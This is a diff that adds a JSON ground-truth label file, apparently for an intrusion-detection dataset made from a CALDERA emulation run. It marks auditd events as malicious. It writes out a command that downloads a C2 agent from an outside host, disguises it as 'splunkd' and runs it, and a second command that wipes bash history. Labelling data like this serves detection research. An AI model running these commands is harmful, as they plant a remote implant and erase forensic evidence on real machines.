@@ -1,0 +1,53 @@
+{
+ "category": "attack",
+ "malicious_event_ids": [
+  "smoke_app01_1200:auditd:0",
+  "smoke_app01_1200:auditd:1",
+  "smoke_app01_1200:auditd:2",
+  "smoke_app01_1200:auditd:3",
+  "smoke_app01_1200:auditd:4",
+  "smoke_app01_1200:auditd:5",
+  "smoke_app01_1200:auditd:6"
+ ],
+ "abilities": [
+  {
+   "name": "Agent deployment",
+   "status": "success",
+   "technique_id": "T1105",
+   "command": "curl -s -X POST -H file:sandcat.go -H platform:linux http://192.168.64.8:8888/file/download ; chmod +x splunkd ; curl -s -X POST -H file:sandcat.go -H platform:linux -H architecture:arm64 http://192.168.64.8:8888/file/download ; chmod +x splunkd ; file splunkd ; ./splunkd -server http://192.168.64.8",
+   "event_ids": [
+    "smoke_app01_1200:auditd:0",
+    "smoke_app01_1200:auditd:1",
+    "smoke_app01_1200:auditd:2",
+    "smoke_app01_1200:auditd:3",
+    "smoke_app01_1200:auditd:4",
+    "smoke_app01_1200:auditd:5"
+   ],
+   "bootstrap": false,
+   "deployment": true,
+   "process_event_ids": [
+    "smoke_app01_1200:auditd:0",
+    "smoke_app01_1200:auditd:1",
+    "smoke_app01_1200:auditd:2",
+    "smoke_app01_1200:auditd:3",
+    "smoke_app01_1200:auditd:4",
+    "smoke_app01_1200:auditd:5"
+   ]
+  },
+  {
+   "name": "Bootstrap T1070.003",
+   "status": "success",
+   "technique_id": "T1070.003",
+   "command": "> $HOME/.bash_history && unset HISTFILE",
+   "event_ids": [
+    "smoke_app01_1200:auditd:6"
+   ],
+   "bootstrap": true,
+   "deployment": false,
+   "process_event_ids": [
+    "smoke_app01_1200:auditd:6"
+   ]
+  }
+ ],
+ "source": "CALDERA report smoke-discovery_report.json + bootstrap actions from ground_truth.json: step pid + descendants, agent lineage"
+}
